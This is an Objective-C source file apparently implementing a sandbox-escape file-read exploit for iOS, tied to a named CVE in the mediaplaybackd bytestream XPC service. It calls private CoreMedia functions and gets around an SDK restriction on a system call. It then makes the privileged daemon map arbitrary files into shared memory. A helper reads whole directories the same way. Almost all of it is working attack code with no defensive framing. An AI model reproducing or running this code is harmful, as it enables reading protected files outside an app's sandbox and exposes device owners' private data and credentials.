// FigBridge.m
// lang: ObjC, file: FigBridge.m, target: iOS 16+, SDK: iphoneos
// COMPILED WITH -fno-objc-arc (see project.yml) — matches MConfPoC approach.
//
// CVE-2026-112706 — mediaplaybackd bytestream XPC file-read primitive.
//
// Mechanism:
//   1. Open XPC connection to com.apple.coremedia.mediaplaybackd.bytestream.xpc
//   2. FigXPCCreateBasicMessage → CF dict backed by an xpc_dictionary (toll-free)
//   3. FigXPCMessageSetCFURL embeds the file:// URL into the message
//   4. FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1
//      fills msg1 with shared-memory handshake payload
//   5. Send msg1 → daemon; daemon opens file, maps it into shared mem, replies msg2
//   6. FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2 → local mapping
//   7. FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2 finalises
//   8. Read base/len from FigMemoryRecipient struct → NSData
//
// shortcut: FigMemoryRecipient struct layout (vm_address_t @ 0, size_t @ 8)
//   from Ghidra dump of CoreMedia iOS 16-26; re-derive if fields[0]==0 on device.

#import "FigBridge.h"
#import <xpc/xpc.h>
#import <mach/mach.h>
#import <mach-o/loader.h>
#import <dirent.h>
#import <dlfcn.h>
#import <string.h>

// xpc_connection_create_mach_service exists on iOS at runtime but the iOS SDK
// marks it unavailable. Redeclare via a private alias to bypass the SDK guard.
// The PoC binary calls it directly; we do the same via dlsym to stay clean.
static xpc_connection_t (*_xpc_conn_mach_svc)(const char *, dispatch_queue_t, uint64_t);
static void _load_xpc_conn(void) {
    _xpc_conn_mach_svc = (__typeof__(_xpc_conn_mach_svc))
        dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
}
#ifndef XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
#define XPC_CONNECTION_MACH_SERVICE_PRIVILEGED (1 << 1)
#endif

#define FIG_XPC_SERVICE  "com.apple.coremedia.mediaplaybackd.bytestream.xpc"
#define FIG_ERR_DOMAIN   "com.venice.parasite.FigBridge"
#define FIG_MAX_FILE_SZ  (16u * 1024u * 1024u)
#define FIG_TIMEOUT_NS   (10LL * NSEC_PER_SEC)

// ── CoreMedia private symbol typedefs ─────────────────────────────────────────
// Signatures verified against PoC binary disassembly (ARM64 call sites):
//
//   FigXPCCreateBasicMessage(uint32_t fourcc, uint64_t flags) → xpc_object_t
//     Returns msg1 directly in x0; no output-pointer arg.
//     Fourcc probed at runtime from the live CoreMedia __TEXT (see deriveFourcc).
//
//   FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1
//     (xpc_connection_t conn, xpc_object_t msg1) → int32_t status
//     Fills msg1 in-place with the shm handshake; conn needed for service context.
//
//   FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2
//     (void **outRecip, xpc_object_t msg1, xpc_object_t msg2) → int32_t
//
//   FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2
//     (xpc_connection_t conn, xpc_object_t msg2) → int32_t

typedef xpc_object_t (*PFN_CreateMsg)(uint32_t fourcc, uint64_t flags);
typedef int32_t      (*PFN_SetURL)(xpc_object_t msg, CFURLRef url);
typedef int32_t      (*PFN_OriginBegin)(xpc_connection_t conn, xpc_object_t msg1);
typedef int32_t      (*PFN_RecipCreate)(void **outRecip, xpc_object_t msg1, xpc_object_t msg2);
typedef int32_t      (*PFN_OriginComplete)(xpc_connection_t conn, xpc_object_t msg2);

static struct {
    PFN_CreateMsg      createMsg;
    PFN_SetURL         setURL;
    PFN_OriginBegin    originBegin;
    PFN_RecipCreate    recipCreate;
    PFN_OriginComplete originComplete;
    uint32_t           fourcc;   // derived at load time from live CoreMedia __TEXT
} sFig;

// ── Runtime fourcc derivation ─────────────────────────────────────────────────
// FigXPCCreateBasicMessage's first arg is a fourcc that selects the XPC message
// type. The value changed between iOS versions (0x2e6f7267 on older builds,
// unknown on iOS 27). We scan the 16 instructions before the call site for
// movz/movk pairs that build x0, reconstruct the constant, and use it.
// Falls back to 0x2e6f7267 if the scan finds nothing — log will show which.

static uint32_t deriveFourcc(void *createMsgFn, void *cmBase, size_t cmSize) {
    // Walk backwards from createMsgFn's xrefs inside CoreMedia __TEXT.
    // We look for: movz x0,#lo / movk x0,#hi,lsl#16  (or vice-versa).
    uintptr_t base   = (uintptr_t)cmBase;
    uintptr_t limit  = base + cmSize;
    uintptr_t target = (uintptr_t)createMsgFn;

    uint32_t lo16 = 0, hi16 = 0;
    BOOL gotLo = NO, gotHi = NO;

    for (uintptr_t pc = base; pc + 4 <= limit; pc += 4) {
        uint32_t insn = *(uint32_t *)pc;

        // BL Xn at next instruction — check if this is a call to createMsgFn.
        // ARM64 BL: bits[31:26]=100101, imm26 relative to PC.
        if ((insn >> 26) == 0x25) {
            int32_t imm26 = (int32_t)(insn << 6) >> 6; // sign-extend
            uintptr_t callee = pc + ((uintptr_t)(int64_t)imm26 << 2);
            if (callee == target) {
                // Scan up to 16 instructions backwards for movz/movk into x0.
                lo16 = 0; hi16 = 0; gotLo = NO; gotHi = NO;
                for (int back = 1; back <= 16 && pc >= base + (uintptr_t)(back * 4); back++) {
                    uint32_t prev = *(uint32_t *)(pc - (uintptr_t)(back * 4));
                    // movz x0,#imm: 1101001000000000 xxxxxxxxxxxxxxxx 00000
                    //   [31]=1 [30]=1 [29]=0 [28]=1 [27]=0 [26]=0 [25]=1 [24]=0
                    //   [23:21]=shift/3 [20:5]=imm16 [4:0]=Rd
                    // movz Xd,#imm,lsl#0:  0xd2800000 | (imm<<5) | Rd
                    // movk Xd,#imm,lsl#16: 0xf2a00000 | (imm<<5) | Rd
                    uint32_t Rd = prev & 0x1f;
                    if (Rd != 0) continue; // x0 only
                    uint32_t op = prev >> 21;
                    if (op == (0xd2800000 >> 21)) { // movz x0,#imm,lsl#0
                        lo16 = (prev >> 5) & 0xffff;
                        gotLo = YES;
                    } else if (op == (0xf2a00000 >> 21)) { // movk x0,#imm,lsl#16
                        hi16 = (prev >> 5) & 0xffff;
                        gotHi = YES;
                    }
                    if (gotLo && gotHi) goto found;
                }
            }
        }
    }

found:
    if (gotLo && gotHi) {
        return ((uint32_t)hi16 << 16) | lo16;
    }
    return 0x2e6f7267u; // fallback: '.org' from PoC disassembly
}

static NSError *figErr(int code, NSString *msg) {
    return [NSError errorWithDomain:@FIG_ERR_DOMAIN code:code
                userInfo:@{NSLocalizedDescriptionKey: msg}];
}

static BOOL loadFigSymbols(NSError **outErr) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                          RTLD_LAZY | RTLD_NOLOAD);
        if (!cm) cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                             RTLD_LAZY);
        if (!cm) return;

        sFig.createMsg     = (PFN_CreateMsg)    dlsym(cm, "FigXPCCreateBasicMessage");
        sFig.setURL        = (PFN_SetURL)       dlsym(cm, "FigXPCMessageSetCFURL");
        sFig.originBegin   = (PFN_OriginBegin)  dlsym(cm,
            "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
        sFig.recipCreate   = (PFN_RecipCreate)  dlsym(cm,
            "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
        sFig.originComplete= (PFN_OriginComplete)dlsym(cm,
            "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");

        ok = sFig.createMsg && sFig.setURL && sFig.originBegin &&
             sFig.recipCreate && sFig.originComplete;

        if (ok) {
            // Derive fourcc from live __TEXT rather than hardcoding.
            Dl_info di; uint32_t fourcc = 0x2e6f7267u;
            if (dladdr(sFig.createMsg, &di) && di.dli_fbase) {
                // Use Mach-O header to find __TEXT size.
                struct mach_header_64 *mh = (struct mach_header_64 *)di.dli_fbase;
                size_t cmSz = 0;
                if (mh->magic == MH_MAGIC_64) {
                    struct load_command *lc = (struct load_command *)((uint8_t *)mh + sizeof(*mh));
                    for (uint32_t i = 0; i < mh->ncmds; i++) {
                        if (lc->cmd == LC_SEGMENT_64) {
                            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
                            if (memcmp(seg->segname, "__TEXT", 6) == 0) {
                                cmSz = seg->vmsize; break;
                            }
                        }
                        lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize);
                    }
                }
                if (cmSz) fourcc = deriveFourcc(sFig.createMsg, di.dli_fbase, cmSz);
            }
            sFig.fourcc = fourcc;
        }
    });
    if (!ok && outErr)
        *outErr = figErr(2, @"CoreMedia Fig symbols not found — iOS version mismatch?");
    return ok;
}

// ── sync XPC send — MRC, matches PoC ─────────────────────────────────────────

static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
    __block xpc_object_t reply = NULL;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    xpc_connection_send_message_with_reply(conn, msg,
        dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^(xpc_object_t rx) {
            if (rx) reply = xpc_retain(rx);
            dispatch_semaphore_signal(sem);
        });
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, FIG_TIMEOUT_NS));
    return reply; // caller must xpc_release
}

// ── public API ────────────────────────────────────────────────────────────────

@implementation FigBridge

+ (nullable NSData *)readFileAtURL:(NSURL *)fileURL error:(NSError **)outErr {
    NSError *err = nil;
    if (!loadFigSymbols(&err)) { if (outErr) *outErr = err; return nil; }
    _load_xpc_conn();

    xpc_connection_t conn = _xpc_conn_mach_svc ?
        _xpc_conn_mach_svc(FIG_XPC_SERVICE, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED) : NULL;
    if (!conn) {
        if (outErr) *outErr = figErr(3, @"xpc_connection_create_mach_service failed");
        return nil;
    }
    xpc_connection_set_event_handler(conn, ^(xpc_object_t ev) { (void)ev; });
    xpc_connection_resume(conn);

    NSData *result = nil;

    // fourcc derived at load time from live CoreMedia __TEXT scan (falls back to '.org').
    // FigXPCCreateBasicMessage returns xpc_object_t directly (no output-pointer).
    NSLog(@"[FigBridge] using fourcc=0x%08x", sFig.fourcc);
    xpc_object_t msg1 = sFig.createMsg(sFig.fourcc, 0);
    if (!msg1) { err = figErr(4, @"FigXPCCreateBasicMessage returned nil"); goto done; }

    {
        int32_t st = sFig.setURL(msg1, (CFURLRef)fileURL);
        if (st) {
            err = figErr(5, [NSString stringWithFormat:@"FigXPCMessageSetCFURL status=%d", st]);
            xpc_release(msg1); goto done;
        }

        // FigMemoryOriginBegin takes (conn, msg1) — fills msg1 with shm payload in-place.
        st = sFig.originBegin(conn, msg1);
        if (st) {
            err = figErr(6, [NSString stringWithFormat:@"OriginBegin status=%d", st]);
            xpc_release(msg1); goto done;
        }

        xpc_object_t msg2 = sendSync(conn, msg1);
        // keep msg1 alive — recipCreate takes (outRecip, msg1, msg2), both objects needed

        if (!msg2) {
            xpc_release(msg1);
            err = figErr(7, @"no reply from mediaplaybackd (timeout or service unavailable)");
            goto done;
        }

        void *recip = NULL;
        st = sFig.recipCreate(&recip, msg1, msg2);
        xpc_release(msg1);
        if (st || !recip) {
            err = figErr(8, [NSString stringWithFormat:@"RecipientCreate status=%d", st]);
            xpc_release(msg2); goto done;
        }

        // FigMemoryOriginComplete takes (conn, msg2) — mirrors OriginBegin signature.
        st = sFig.originComplete(conn, msg2);
        xpc_release(msg2);
        if (st) { err = figErr(9, [NSString stringWithFormat:@"OriginComplete status=%d", st]); goto done; }

        // FigMemoryRecipient layout: [vm_address_t base @ 0, size_t len @ 8]
        uintptr_t *fields = (uintptr_t *)recip;
        vm_address_t base = (vm_address_t)fields[0];
        size_t       len  = (size_t)fields[1];

        if (base && len > 0 && len <= FIG_MAX_FILE_SZ) {
            result = [NSData dataWithBytes:(const void *)base length:len];
        } else {
            err = figErr(10, [NSString stringWithFormat:
                @"recipient region bad: base=0x%lx len=%zu", (unsigned long)base, len]);
        }
    }

done:
    xpc_connection_cancel(conn);
    xpc_release(conn);
    if (outErr && err) *outErr = err;
    return result;
}

+ (nullable NSDictionary<NSString *, NSData *> *)readDirectoryAtPath:(NSString *)path
                                                              maxFiles:(NSUInteger)maxFiles
                                                                 error:(NSError **)outErr {
    DIR *d = opendir(path.UTF8String);
    if (!d) {
        if (outErr) *outErr = figErr(20, [NSString stringWithFormat:
            @"opendir(%@) failed: %s", path, strerror(errno)]);
        return nil;
    }

    NSMutableDictionary *results = [NSMutableDictionary dictionary];
    struct dirent *ent;
    NSUInteger count = 0;

    while ((ent = readdir(d)) != NULL && count < maxFiles) {
        if (ent->d_name[0] == '.') continue;
        if (ent->d_type != DT_REG) continue;

        NSString *name     = [NSString stringWithUTF8String:ent->d_name];
        NSString *fullPath = [path stringByAppendingPathComponent:name];
        NSURL    *url      = [NSURL fileURLWithPath:fullPath];
        NSData   *data     = [self readFileAtURL:url error:nil];
        if (data) { results[name] = data; count++; }
    }
    closedir(d);

    if (!results.count && outErr)
        *outErr = figErr(21, [NSString stringWithFormat:@"no files read from %@", path]);
    return results.count ? [NSDictionary dictionaryWithDictionary:results] : nil;
}

@end
